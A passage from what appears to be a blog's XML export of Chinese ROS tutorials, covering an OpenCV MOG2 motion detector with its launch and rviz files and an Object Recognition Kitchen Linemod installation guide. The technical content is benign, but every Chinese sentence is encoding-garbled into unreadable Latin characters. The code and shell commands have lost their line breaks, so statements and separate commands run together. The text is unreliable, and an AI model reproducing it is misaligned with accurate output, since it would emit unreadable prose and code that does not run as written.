ä¸‹ä¸€æ­¥æ˜¯ä»€éº¼ï¼Ÿä¸‹ä¸€æ­¥å°±çœ‹ä½ æƒ³è¦æ‹¿ GPS ä¾†åšä»€éº¼å¯¦é©—ï¼Œä½ å¯ä»¥å¥—ç”¨è‡ªå·±çš„æ©Ÿå™¨äººã€è¨­è¨ˆè‡ªå·±çš„å¯¦é©—ç­‰ç­‰ï¼Œæˆ–æ˜¯ä»¥ç›®å‰çš„ç’°å¢ƒç‚ºèµ·é»å®Œå…¨å¼„æ‡‚ GPS çš„å¯¦ä½œç´°ç¯€ï¼Œæœ‰æ»¿å¤šæ±è¥¿å¯ä»¥å»¶ä¼¸çš„ã€‚
ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä»‹ç´¹äº† Guided Policy Search çš„ç’°å¢ƒå®‰è£è·ŸåŸºæœ¬æ¦‚å¿µï¼Œä¸»è¦æ˜¯æƒ³å¹«åŠ©æœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥æ¸›è¼•å…¥é–€çš„ç’°å¢ƒå®‰è£é–€æª»ï¼Œæ›´è©³ç´°çš„æ¼”ç®—æ³•æ¦‚å¿µå¯ä»¥åƒè€ƒ æ·±å…¥æ·ºå‡º End-to-End Learning on Roboticsï¼Œæˆ–ä½ ä¹Ÿå¯ä»¥å»çœ‹ Guided Policy Search çš„è«–æ–‡ï¼Œæœƒå¹«åŠ©ä½ å°æ¼”ç®—æ³•æœ¬èº«æ›´åŠ äº†è§£ã€‚
å»¶ä¼¸é–±è®€
æ·±å…¥æ·ºå‡º End-to-End Learning on Robotics

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨å­¸ç¿’çœ‹æ¸…äº‹ç‰©çš„æœ¬è³ªèˆ‡æ”¹é€²è‡ªå·±çš„è§€å¿µ
]]></content>
      <tags>
        <tag>ROS, Guided Policy Search, Reinforcement Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¥æ”¶ä¾†è‡ª ROS Topic çš„å½±åƒä¸¦åµæ¸¬ç•«é¢ä¸­çš„å‹•ä½œ</title>
    <url>/2016/11/26/ros-motion-detector/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡ä¾†å¸¶å¤§å®¶ç©å€‹åŸºç¤çš„æ‡‰ç”¨ - å‹•ä½œåµæ¸¬,ç”¨è‡ªå·±ç­†é›»çš„ç›¸æ©Ÿå†åŠ ä¸Š OpenCV çš„ APIï¼Œå°±å¯ä»¥åšåˆ°å‹•ä½œåµæ¸¬ä¸¦æŠŠåœ¨å‹•çš„åœ°æ–¹æ¡†èµ·ä¾†ã€‚å¯ä»¥é€éé€™ç¯‡å­¸ç¿’æ€éº¼ä½¿ç”¨ ROS Topic ä¾†æ¥æ”¶å½±åƒä¸¦åšå¾ŒçºŒçš„è™•ç†ã€‚
é–‹ package å¯«ç¨‹å¼é¦–å…ˆä¾†é–‹ä¸€å€‹ motion_detector package:
catkin_create_pkg motion_detector rospy sensor_msgs cv_bridge usb_cam\cd motion_detectorvim src/motion_detector.py

ç¨‹å¼ç¢¼é•·é€™æ¨£ï¼Œè£¡é¢ä¸»è¦æ˜¯ç”¨åˆ° OpenCV çš„ MOG2 é€™å€‹å‰èƒŒæ™¯åˆ†é¡çš„å·¥å…·ï¼Œåˆ‡å‡ºä¾†çš„å‰æ™¯å°±ç”¨ä¸€å€‹æ¡†æ¡†ä¾†è¡¨ç¤ºã€‚
#!/usr/bin/env pythonimport rospyimport cv2import numpy as npfrom cv_bridge import CvBridge, CvBridgeErrorfrom sensor_msgs.msg import Imagekernel_elliptic_7 = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (7, 7))kernel_elliptic_15 = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (15, 15))area_threshold = 2000class MOG2:  def __init__(self):    self.fgbg = cv2.BackgroundSubtractorMOG2(history=150, varThreshold=500, bShadowDetection=True)  def detect(self,image):    fgmask = self.fgbg.apply(image)    cv2.morphologyEx(fgmask, cv2.MORPH_CLOSE, kernel_elliptic_7, dst=fgmask)    cv2.morphologyEx(fgmask, cv2.MORPH_OPEN, kernel_elliptic_15, dst=fgmask)    contours = cv2.findContours(fgmask.astype(np.uint8), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)    area_box = ((cv2.contourArea(contour), cv2.boundingRect(contour)) for contour in contours[0])    area_box = [(area, box) for (area, box) in area_box if area &gt; area_threshold]    area_box.sort(reverse=True)    bounding_boxes = [((x, y), (x+w, y+h)) for _, (x, y, w, h) in area_box[:5]]    for p1, p2 in bounding_boxes:        cv2.rectangle(image, p1, p2, (0, 255, 0), 2)    return image    #return fgmask #for param tuningclass Motion:    def __init__(self):        rospy.init_node(&quot;motion_detector_node&quot;)        self.bridge = CvBridge()        self.pub = rospy.Publisher(&#x27;camera/visible/image&#x27;, Image, queue_size=2)        rospy.Subscriber(&quot;usb_cam/image_raw&quot;, Image, self.imageCallback)        self.motion_detector = MOG2()        rospy.spin()    def imageCallback(self, image):        if self.motion_detector:            cv_image = self.bridge.imgmsg_to_cv2(image, &quot;bgr8&quot;)            result_img = self.motion_detector.detect(cv_image)            image = self.bridge.cv2_to_imgmsg(result_img, &quot;bgr8&quot;)            #image = self.bridge.cv2_to_imgmsg(result_img, &quot;mono8&quot;) #for param tuning        self.pub.publish(image)if __name__ == &#x27;__main__&#x27;:    detector = Motion()

åŸ·è¡Œç¨‹å¼å…ˆæŠŠç¨‹å¼è®Šæˆå¯åŸ·è¡Œçš„ nodeï¼Œæ¥ç€ä¾†å¯«å€‹ launch file æ–¹ä¾¿åŸ·è¡Œï¼š
chmod +x src/motion_detector.pymkdir launchvim launch/motion_detection.launch

&lt;launch&gt;  &lt;!-- Launch the motion detector node for image processing. --&gt;  &lt;node pkg=&quot;motion_detector&quot; name=&quot;MotionDetector&quot; type=&quot;motion_detector.py&quot;/&gt;  &lt;!-- Launch the driver node for our usb camera. --&gt;  &lt;node name=&quot;usb_cam&quot; pkg=&quot;usb_cam&quot; type=&quot;usb_cam_node&quot; output=&quot;screen&quot; &gt;   &lt;param name=&quot;video_device&quot; value=&quot;/dev/video0&quot; /&gt;   &lt;param name=&quot;image_width&quot; value=&quot;640&quot; /&gt;   &lt;param name=&quot;image_height&quot; value=&quot;480&quot; /&gt;   &lt;param name=&quot;pixel_format&quot; value=&quot;yuyv&quot; /&gt;   &lt;param name=&quot;camera_frame_id&quot; value=&quot;usb_cam&quot; /&gt;   &lt;param name=&quot;io_method&quot; value=&quot;mmap&quot;/&gt;  &lt;/node&gt;  &lt;node name=&quot;rviz&quot; pkg=&quot;rviz&quot; type=&quot;rviz&quot; required=&quot;true&quot;       args=&quot;-d $(find motion_detector)/rviz/motion.rviz&quot; /&gt;&lt;/launch&gt;

é€™é‚Šæƒ³é †ä¾¿æ•™å¤§å®¶ä¸€å€‹æŠ€å·§ï¼Œä½ å¯ä»¥æŠŠ rviz çš„æª”æ¡ˆå…ˆå¯«å¥½ï¼Œé€™æ¨£æ¯æ¬¡é‡æ–°å•“å‹• Rviz å°±å¾ˆæ–¹ä¾¿ï¼Œä¸ç”¨é‡æ–°é¸æƒ³è¦çœ‹çš„è³‡æ–™é¡å‹ã€‚
vim rviz/motion.rviz

å…¶å¯¦é€™å€‹æª”æ¡ˆå¯ä»¥ç›´æ¥å¾ Rviz å­˜å‡ºä¾†ï¼Œæˆ–æ˜¯ä½ ä¹Ÿå¯ä»¥å¾ˆ hardcore åœ°è‡ªå·±å¯«XD
Panels:  - Class: rviz/Displays    Help Height: 78    Name: Displays    Property Tree Widget:      Expanded:        - /Global Options1        - /Status1        - /Image1      Splitter Ratio: 0.5    Tree Height: 387  - Class: rviz/Selection    Name: Selection  - Class: rviz/Tool Properties    Expanded:      - /2D Pose Estimate1      - /2D Nav Goal1      - /Publish Point1    Name: Tool Properties    Splitter Ratio: 0.588679  - Class: rviz/Views    Expanded:      - /Current View1    Name: Views    Splitter Ratio: 0.5  - Class: rviz/Time    Experimental: false    Name: Time    SyncMode: 0    SyncSource: ImageVisualization Manager:  Class: &quot;&quot;  Displays:    - Alpha: 0.5      Cell Size: 1      Class: rviz/Grid      Color: 160; 160; 164      Enabled: true      Line Style:        Line Width: 0.03        Value: Lines      Name: Grid      Normal Cell Count: 0      Offset:        X: 0        Y: 0        Z: 0      Plane: XY      Plane Cell Count: 10      Reference Frame: &lt;Fixed Frame&gt;      Value: true    - Class: rviz/Image      Enabled: true      Image Topic: /camera/visible/image      Max Value: 1      Median window: 5      Min Value: 0      Name: Image      Normalize Range: true      Queue Size: 2      Transport Hint: raw      Unreliable: false      Value: true  Enabled: true  Global Options:    Background Color: 48; 48; 48    Fixed Frame: map    Frame Rate: 30  Name: root  Tools:    - Class: rviz/Interact      Hide Inactive Objects: true    - Class: rviz/MoveCamera    - Class: rviz/Select    - Class: rviz/FocusCamera    - Class: rviz/Measure    - Class: rviz/SetInitialPose      Topic: /initialpose    - Class: rviz/SetGoal      Topic: /move_base_simple/goal    - Class: rviz/PublishPoint      Single click: true      Topic: /clicked_point  Value: true  Views:    Current:      Class: rviz/Orbit      Distance: 10      Enable Stereo Rendering:        Stereo Eye Separation: 0.06        Stereo Focal Distance: 1        Swap Stereo Eyes: false        Value: false      Focal Point:        X: 0        Y: 0        Z: 0      Name: Current View      Near Clip Distance: 0.01      Pitch: 0.785398      Target Frame: &lt;Fixed Frame&gt;      Value: Orbit (rviz)      Yaw: 0.785398    Saved: ~Window Geometry:  Displays:    collapsed: false  Height: 668  Hide Left Dock: false  Hide Right Dock: false  Image:    collapsed: false  QMainWindow State: 000000ff00000000fd00000004000000000000016a00000212fc0200000008fb0000001200530065006c0065006300740069006f006e00000001e10000009b0000006400fffffffb0000001e0054006f006f006c002000500072006f007000650072007400690065007302000001ed000001df00000185000000a3fb000000120056006900650077007300200054006f006f02000001df000002110000018500000122fb000000200054006f006f006c002000500072006f0070006500720074006900650073003203000002880000011d000002210000017afb000000100044006900730070006c006100790073010000002800000212000000dd00fffffffb0000002000730065006c0065006300740069006f006e00200062007500660066006500720200000138000000aa0000023a00000294fb00000014005700690064006500530074006500720065006f02000000e6000000d2000003ee0000030bfb0000000c004b0069006e0065006300740200000186000001060000030c00000261000000010000010f00000212fc0200000003fb0000001e0054006f006f006c002000500072006f00700065007200740069006500730100000041000000780000000000000000fb0000000a00560069006500770073010000002800000212000000b000fffffffb0000001200530065006c0065006300740069006f006e010000025a000000b2000000000000000000000002000004b0000000a9fc0100000002fb0000000a0049006d006100670065030000014b0000009700000287000001a3fb0000000a00560069006500770073030000004e00000080000002e10000019700000003000004b00000003efc0100000002fb0000000800540069006d00650100000000000004b0000002f600fffffffb0000000800540069006d006501000000000000045000000000000000000000022b0000021200000004000000040000000800000008fc0000000100000002000000010000000a0054006f006f006c00730100000000ffffffff0000000000000000  Selection:    collapsed: false  Time:    collapsed: false  Tool Properties:    collapsed: false  Views:    collapsed: false  Width: 1200  X: 55  Y: 14

åŸ·è¡Œçµæœroslaunch motion_detector motion_detection.launch

ç”¨ä¸Šé¢çš„æŒ‡ä»¤è·‘èµ·ä¾†ä¹‹å¾Œï¼Œå°±å¯ä»¥çœ‹åˆ°åœ¨å‹•çš„æ±è¥¿è¢«æ¡†æ¡†åœˆèµ·ä¾†å•¦ï¼

å»¶ä¼¸é–±è®€
ROS è·Ÿ OpenCV ä¸²æ¥çš„å·¥å…· - cv_bridge
ç”¨ Optical Flow ä¾†åµæ¸¬å‹•ä½œ

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›
]]></content>
      <tags>
        <tag>æ©Ÿå™¨äºº, ROS, å‹•ä½œåµæ¸¬, OpenCV, Mixture of Gaussian</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Object Recognition Kitchen çš„ Linemod æ¼”ç®—æ³•è¾¨è­˜ç‰©é«”</title>
    <url>/2016/05/14/ros-object-recognition-kitchen/</url>
    <content><![CDATA[å‰è¨€é€™æ¬¡è¦ä»‹ç´¹çš„å·¥å…·æ˜¯ ROS è£¡é¢å°ˆé–€ç”¨ä¾†ä½œç‰©é«”è¾¨è­˜çš„ Object Recognition Kitchen (ä»¥ä¸‹ç°¡ç¨±ç‚º ORK )ï¼Œé€™å€‹å·¥å…·æ¯”è¼ƒåƒæ˜¯ä¸€å€‹æ¡†æ¶ï¼Œè£¡é¢åŒ…å«äº†å¥½å¹¾ç¨®æ¼”ç®—æ³•(ä½ å¯ä»¥æ ¹æ“šè‡ªå·±çš„éœ€æ±‚ä½¿ç”¨ä¸åŒçš„æ¼”ç®—æ³•)ï¼Œé€™ç¯‡æ–‡ç« è¦ä»‹ç´¹çš„åªæ˜¯å…¶ä¸­ä¸€ç¨® â€“ Linemod ã€‚ Linemod æ˜¯ä¸€å€‹è¾¨è­˜æ•ˆæœå¾ˆä¸éŒ¯çš„ 3D ç‰©é«”è¾¨è­˜æ¼”ç®—æ³•(ä¸éä¸€å€‹ä½¿ç”¨æ¢ä»¶æ˜¯ç‰©é«”é ˆæ˜¯å‰›é«”)ï¼Œæ‰€ä»¥æƒ³è—‰æ­¤æ©Ÿæœƒåˆ†äº«çµ¦å¤§å®¶ï¼Œä»¥å¾Œåªè¦ä½ æƒ³è¦ï¼Œå°±å¯ä»¥ç›´æ¥æ‹¿é€™å€‹å·¥å…·ä¾†ä¸²è‡ªå·±çš„æ©Ÿå™¨äººæ‡‰ç”¨ã€‚
å®‰è£ ORK &amp; Linemodé›–ç„¶ ORK çš„é–‹ç™¼è€…å·²ç¶“å¯«äº†ä¸€ä»½æ»¿ä¸éŒ¯çš„å®‰è£ tutorialï¼Œä¸éæˆ‘è¦ºå¾—é‚„æ˜¯å€¼å¾—ç‚ºä»–å†å¯«ä¸€ä»½è‡ªå·±çš„æ•´ç†ç­†è¨˜ï¼Œå¯ä»¥æŠŠéç¨‹ä¸­é‡åˆ°çš„ä¸€äº›å•é¡Œéƒ½æ•´ç†ä¸‹ä¾†ä¾›å¤§å®¶åƒè€ƒã€‚
æˆ‘ç›®å‰è·‘èµ·ä¾†çš„ç’°å¢ƒæ˜¯ Ubuntu 14.04+ROS Indigoï¼Œé¦–å…ˆä¾†è£ä¸€äº› ORK éœ€è¦ç”¨åˆ°çš„ package !
export DISTRO=indigosudo apt-get install libopenni-dev ros-$&#123;DISTRO&#125;-catkin ros-$&#123;DISTRO&#125;-ecto* ros-$&#123;DISTRO&#125;-opencv-candidate ros-$&#123;DISTRO&#125;-moveit-msgs

æ¥ä¸‹ä¾†å°±è¦å®‰è£ ORK å•¦ï¼Œç„¶å¾Œå› ç‚ºæˆ‘æ¯”è¼ƒå–œæ­¡ build from sourceï¼Œæ‰€ä»¥æˆ‘æœƒä¸‹é¢æœƒæ”¾ä¸Šä¸€ä»½è¤‡é›œç‰ˆçš„å®‰è£æ–¹æ³•ï¼Œè£¡é¢æœƒæœ‰æ¯”è¼ƒå¤šè·Ÿ error å¥®é¬¥çš„éç¨‹ï¼Œå¦‚æœä½ æ¯”è¼ƒå–œæ­¡ç›´æ¥ç©æ‡‰ç”¨ï¼Œå®‰è£ä»€éº¼çš„æ‡¶å¾—ç®¡ï¼Œé‚£çœ‹ç°¡å–®ç‰ˆçš„å®‰è£æ–¹å¼å…¶å¯¦å°±å¯ä»¥äº†ã€‚
è¶…ç°¡å–®ç‰ˆå®‰è£æ–¹å¼è¶…ç°¡å–®ç‰ˆé¡§åæ€ç¾©å°±æ˜¯è¶…ç°¡å–®ï¼Œå®Œå…¨ä¸è¦ç®¡æˆ‘å€‘æœƒç”¨åˆ°å“ªäº› packageï¼Œåªè¦æ˜¯ ORK åº•ä¸‹çš„ packageï¼Œéƒ½è£ä¸‹å»ï¼Œç¼ºé»å°±æ˜¯æœƒå¤šæµªè²»ä¸€äº›ç¡¬ç¢Ÿç©ºé–“ã€‚åªè¦ç”¨ä¸€è¡ŒæŒ‡ä»¤å°±æå®š:
sudo apt-get install ros-indigo-object-recognition-kitchen-*

ç¨å¾®ç†è§£è‡ªå·±è£äº†ä»€éº¼çš„å®‰è£æ–¹å¼sudo apt-get install ros-indigo-object-recognition-core ros-indigo-object-recognition-linemod ros-indigo-object-recognition-msgs ros-indigo-object-recognition-renderer ros-indigo-object-recognition-ros ros-indigo-object-recognition-ros-visualization

Build From Sourceç‰ˆå®‰è£æ–¹å¼é¦–å…ˆä¾†å…ˆè£è·Ÿ ROS éŠœæ¥çš„ packageï¼Œé¦–å…ˆè¦å…ˆé–‹å•Ÿ terminalï¼Œåˆ‡åˆ° catkin_workspace&#x2F;src åº•ä¸‹
git clone http://github.com/wg-perception/object_recognition_msgsgit clone http://github.com/wg-perception/object_recognition_rosgit clone http://github.com/wg-perception/object_recognition_ros_visualization

ç„¶å¾Œå› ç‚ºä»Šå¤©çš„ä¸»è§’æ˜¯ linemodï¼Œæ‰€ä»¥éœ€è¦å®‰è£ç›¸é—œ package
git clone http://github.com/wg-perception/object_recognition_coregit clone http://github.com/wg-perception/linemodgit clone http://github.com/wg-perception/ork_renderercd ../ &amp;&amp; catkin_make

åœ¨ catkin_make çš„éç¨‹ä¸­å¯èƒ½æœƒç¢°åˆ°å›  error è€Œä¸­æ–·ï¼Œæœƒçœ‹åˆ°é¡ä¼¼å¦‚ä¸‹çš„è¨Šæ¯ï¼š

é€™æ™‚å€™ä¸è¦æ€•ï¼Œç¹¼çºŒçµ¦ä»– catkin_make ä¸‹å»ï¼Œä½ å°±æœƒç™¼ç¾ç·¨è­¯é€²åº¦æœƒç¥å¥‡åœ°æœ‰é€²å±•ï¼š

ä¸éæˆ‘æœ‰ç¢°åˆ°ä¸€å€‹å•é¡Œï¼Œå†æ€éº¼é‡æ–°ç·¨è­¯éƒ½æ²’æœ‰ç”¨:
In file included from /home/rosindigo/catkin_ws/src/ork_renderer/src/renderer3d.cpp:50:0:/home/rosindigo/catkin_ws/src/ork_renderer/src/renderer3d_impl_osmesa.h:39:23: fatal error: GL/osmesa.h: æ²’æœ‰æ­¤ä¸€æª”æ¡ˆæˆ–ç›®éŒ„ #include &lt;GL/osmesa.h&gt; ^ compilation terminated. make[2]: *** [ork_renderer/src/CMakeFiles/object_recognition_renderer_3d.dir/renderer3d.cpp.o] Error 1 make[1]: *** [ork_renderer/src/CMakeFiles/object_recognition_renderer_3d.dir/all] Error 2 make: *** [all] Error 2 Invoking &quot;make -j8 -l8&quot; failed

å› ç‚ºæ˜¯å°‘äº† GL&#x2F;osmesa.hï¼Œæ‰€ä»¥éœ€è¦é¡å¤–ä¸‹ä¸€å€‹æŒ‡ä»¤ sudo apt-get install libosmesa6-dev ä¾†å®‰è£ã€‚
è£åˆ°é€™é‚Šé‚„æœƒæœ‰ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯é›–ç„¶ç·¨è­¯éƒ½å·²ç¶“éäº†ï¼Œä½† roscd object_recognition_core æ™‚éƒ½æœƒå‡ºç¾ç„¡æ³•æ‰¾åˆ°æ­¤ package çš„ errorï¼Œç”±æ–¼é€™æœƒå°å¾ŒçºŒè¦åŸ·è¡Œæ¼”ç®—æ³•æ™‚é€ æˆå•é¡Œï¼Œæ‰€ä»¥é‚„æ˜¯è¦ä¾†è™•ç†ä¸€ä¸‹ã€‚
æˆ‘å€‘å…ˆé‡æ–°ç†ä¸€ä¸‹æ€è·¯ï¼Œç†è«–ä¸Šï¼Œç·¨è­¯éä¹‹å¾Œå°±æœƒè¢«åŠ å…¥åˆ° roscd å¯ä»¥æ‰¾åˆ°çš„ path ä¸­ï¼Œä½†æ˜¯ roscd é¡¯ç„¶å°±è¡¨ç¤ºæ²’æœ‰è¢«åŠ é€²  ROS_PACKAGE_PATH ä¸­ï¼Œgoogle äº†ä¸€ä¸‹ç™¼ç¾åˆ°æœ‰äººä¹Ÿé‡éé¡ä¼¼çš„å•é¡Œï¼Œè§£æ³•ä¹Ÿç¢ºå¯¦å°±æ˜¯æŠŠæˆ‘å€‘ git clone ä¸‹ä¾†çš„é‚£äº› package åŠ å…¥åˆ° ROS_PACKAGE_PATH ä¸­ï¼Œé€™æ¨£çš„è©±å•é¡Œå°±ç°¡å–®å•¦!
 å…ˆ vim ~/.bashrc ä¸€ä¸‹ï¼Œç„¶å¾Œåœ¨æœ€ä¸‹é¢è£œä¸Šä¸€è¡Œ:
export ROS_PACKAGE_PATH=&quot;$ROS_PACKAGE_PATH:/home/rosindigo/catkin_ws/src&quot;

è£œå®Œçš„çµæœçœ‹èµ·ä¾†å°±åƒ:

æ¥ä¸Šä¸¦å¾ RGB-D Sensor æ”¶è³‡æ–™æ¥ä¸‹ä¾†æˆ‘å€‘è¦å…ˆè™•ç†æ„Ÿæ¸¬å™¨é€™å¡Šï¼Œç•¢ç«Ÿå¦‚æœæ²’æœ‰æ„Ÿæ¸¬å™¨ï¼Œé‚£å°±æ ¹æœ¬ä¸ç”¨è¾¨è­˜ç‰©é«”çš„å°å§ã€‚åŸæœ¬å®˜æ–¹æ•™å­¸ä¸Šæ˜¯å»ºè­°ç”¨ roslaunch openni2_launch openni2.launchï¼Œä½†å› ç‚ºæˆ‘æ˜¯ç”¨ Kinect 1ï¼Œè¦ç”¨ roslaunch openni_launch openni.launchã€‚
è·‘èµ·ä¾†ä¹‹å¾Œæ‡‰è©²å°±å¯ä»¥åœ¨ Rviz çœ‹åˆ°ä»¥ä¸‹çš„ç•«é¢:

å®‰è£ç‰©é«”è¾¨è­˜è³‡æ–™åº« &amp; åŠ å…¥ modelORK æ˜¯ä¸€å¥—ä»¥ template matching æ–¹æ³•ç‚ºä¸»çš„è¾¨è­˜å·¥å…·ï¼Œä¹Ÿå°±æ˜¯èªªï¼Œä»–æœƒæŠŠæ„Ÿæ¸¬å™¨çœ‹åˆ°çš„ç‰©é«”è·Ÿè³‡æ–™åº«ä¸­çš„ç‰©é«”æ¯”å°ï¼Œå¤ ç›¸ä¼¼çš„å°±ç®—æ˜¯è¾¨è­˜æˆåŠŸï¼Œæ‰€ä»¥æˆ‘å€‘æ¥è‘—è¦ä¾†è™•ç†è³‡æ–™åº«é€™ä¸€å¡Šã€‚é¦–å…ˆè¦å®‰è£ CouchDB é€™å€‹å·¥å…· (ç”¨ sudo apt-get install couchdb )ã€‚
æ¥ä¸‹ä¾†æª¢æŸ¥ä¸€ä¸‹æ˜¯å¦æœ‰å®‰è£æˆåŠŸ (ç”¨ curl -X GET http://localhost:5984 )ã€‚å¦‚æœæˆåŠŸï¼Œæ‡‰è©²æœƒçœ‹åˆ°é¡ä¼¼ä¸‹é¢çš„ç•«é¢ï¼š

rosrun object_recognition_core object_add.py -n &quot;coke &quot; -d &quot;A universal can of coke&quot; --commit

åŸ·è¡Œä¸Šé¢é€™å€‹æŒ‡ä»¤ä¹‹å¾Œï¼Œä½ å¯ä»¥å» http://localhost:5984/_utils/database.html?object_recognition/_design/objects/_view/by_object_name çœ‹çœ‹è‡ªå·±çš„è³‡æ–™åº«è£¡æ˜¯å¦å·²ç¶“æ–°å¢äº†é€™å€‹ç‰©é«”ï¼š

æ¥ä¸‹ä¾†å°±æ˜¯è¦æŒ‡å®šé€™å€‹ç‰©é«”çš„ 3D æ¨¡å‹æ˜¯ä»€éº¼ï¼Œé€™é‚Šå°±éœ€è¦å…ˆä¸‹è¼‰å€‹ package ä¸¦ç·¨è­¯ã€‚
git clone https://github.com/wg-perception/ork_tutorialscd .. &amp;&amp; catkin_make

ork_tutorialsè£¡é¢æœ‰ä¸€å€‹ coke.stl æª”ï¼Œä»–å°±æ˜¯ä¸€å€‹å¯æ¨‚ç½çš„ 3D æ¨¡å‹ï¼Œè¶³å¤ è®“æˆ‘å€‘å…ˆç”¨ä¾†è¾¨è­˜ã€‚æ³¨æ„ä¸‹é¢é€™å€‹æŒ‡ä»¤ä¸­æœ‰ä¸€ä¸²çœ‹èµ·ä¾†åƒäº‚ç¢¼çš„æ±è¥¿ï¼Œä½†é‚£å…¶å¯¦æ˜¯ç‰©é«”çš„ id ï¼Œé€™å°±è¦å¾ä½ è‡ªå·±çš„è³‡æ–™åº«è£¡å»çœ‹äº†ã€‚
rosrun object_recognition_core mesh_add.py 0be612246c9b0a00baaa4adefb0009eb /home/rosindigo/catkin_ws/src/ork_tutorials/data/coke.stl --commit

åŸ·è¡Œ Linemod æ¼”ç®—æ³• (Training &amp; Detection)å¥½äº†!çµ‚æ–¼è¦é€²å…¥æ­£é¡Œäº†ï¼Œé€™ä¸€å¡Šä¸€æ¨£æœ‰ å®˜æ–¹tutorial å¯ä»¥åƒè€ƒï¼Œæˆ‘å€‘å…ˆå¾ Training é–‹å§‹ã€‚
rosrun object_recognition_core training -c `rospack find object_recognition_linemod`/conf/training.ork

é€™å€‹ training æŒ‡ä»¤æœƒåˆ©ç”¨è³‡æ–™åº«è£¡çš„ 3D æ¨¡å‹å»ºç«‹è¾¨è­˜æ™‚æ‰€éœ€è¦çš„ templateï¼Œå¦‚æœåŸ·è¡ŒæˆåŠŸï¼Œä½ æœƒçœ‹åˆ°å¦‚ä¸‹çš„è¨Šæ¯ï¼š

å¦‚æœå·²ç¶“è¨“ç·´å®Œç•¢ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯ç”¨ä»–ä¾†è¾¨è­˜ç‰©é«”å•¦ã€‚
å¯æƒœç­†è€…çš„ Kinect çªç„¶å£æ‰äº†ï¼Œæ²’æœ‰è¾¦æ³•ç›´æ¥ demo å‡ºä¾†ï¼Œä¸éé€™é‚Šçš„æŒ‡ä»¤ä¹Ÿä¸æœƒå¾ˆè¤‡é›œã€‚
roslaunch openni_launch openni.launchrosrun dynamic_reconfigure dynparam set /camera/driver depth_registration Truerosrun dynamic_reconfigure dynparam set /camera/driver image_mode 2 rosrun dynamic_reconfigure dynparam set /camera/driver depth_mode 2rosrun topic_tools relay /camera/depth_registered/image_raw /camera/depth_registered/imagerosrun object_recognition_core detection -c  `rospack find object_recognition_linemod`/conf/detection.ros.ork

æ¥ä¸‹ä¾†å°±å¯ä»¥ç”¨ Rviz ä¾†çœ‹è¾¨è­˜çµæœå•¦ï¼

æ¼”ç®—æ³•ç°¡ä»‹æ—¢ç„¶ Linemod æ˜¯ä¸€å€‹é€™éº¼å¼·å¤§çš„æ¼”ç®—æ³•ï¼Œè©¦è‘—å»ç¨å¾®äº†è§£ä¸€ä¸‹æ¼”ç®—æ³•ä¹Ÿæ˜¯å¾ˆåˆç†çš„ï¼ŒåŸå§‹çš„è«–æ–‡åœ¨é€™é‚Š (2011 ICCV çš„ oral è«–æ–‡)ï¼Œä»¥ä¸‹çš„åœ–ç‰‡ä¹Ÿæ˜¯å‡ºè‡ªé€™ç¯‡è«–æ–‡ã€‚
é¦–å…ˆä¾†çœ‹ä¸€ä¸‹é€™ç¯‡è«–æ–‡çš„è¾¨è­˜çµæœï¼š

é€™å€‹æ¼”ç®—æ³•çš„æ ¸å¿ƒæ¦‚å¿µå°±æ˜¯æ•´åˆå¤šç¨®ä¸åŒçš„ modalitiesï¼ŒæŠŠ modality æƒ³æˆç‰©é«”çš„ä¸åŒç‰¹å¾µå¯èƒ½æ¯”è¼ƒå¥½æ‡‚ï¼Œä¾‹å¦‚ä¸‹åœ–ä¸­å°±æœ‰å…©ç¨® modalities â€“ gradient è·Ÿ surface normalï¼Œè€Œå› ç‚ºé€™å…©ç¨®ç‰¹å¾µæ‰€è¡¨é”çš„ç‰¹æ€§ä¸ä¸€æ¨£ï¼Œæ‰€ä»¥å¯ä»¥äº’è£œï¼Œé€²è€Œé”åˆ°æ›´å¥½çš„è¾¨è­˜æ•ˆæœã€‚

æ‰€ä»¥èªªï¼ŒLinemod éœ€è¦å…ˆæœ‰å·²çŸ¥çš„ç‰©é«”æ¨¡å‹ï¼Œç„¶å¾Œå…ˆå–å¾—é€™å€‹ç‰©é«”å„ç¨® modlaities çš„templateï¼Œé€™æ¨£åœ¨è¾¨è­˜çš„æ™‚å€™å°±å¯ä»¥æ‹¿ template ä¾†æ¯”å°ã€‚
ä¸éé€™æ¦‚å¿µåœ¨é›»è…¦è¦–è¦ºé ˜åŸŸä¸­ä¸¦ä¸ç‰¹åˆ¥ï¼Œå› ç‚ºåŒæ™‚ä½¿ç”¨ä¸åŒç‰¹å¾µä¾†åŠ å¼·ç‰©é«”è¾¨è­˜çš„æ•ˆæœæ˜¯å¾ˆç›´è¦ºçš„ï¼Œä¹Ÿæœ‰å¾ˆå¤šä¸åŒçš„æ–¹æ³•å¯ä»¥åšåˆ°é€™ä»¶äº‹æƒ…ï¼Œæ‰€ä»¥é€™ç¯‡è«–æ–‡é‚„æå‡ºäº†ä¸€å€‹æ–¹æ³•ä¾†å¢é€² similarity measurement çš„æ•ˆç‡ ( similarity measurement çš„æ„æ€æ˜¯ measure å„²å­˜çš„ template è·Ÿç¾åœ¨çœ‹åˆ°çš„å½±åƒè³‡æ–™æœ‰å¤šæ¥è¿‘)ã€‚
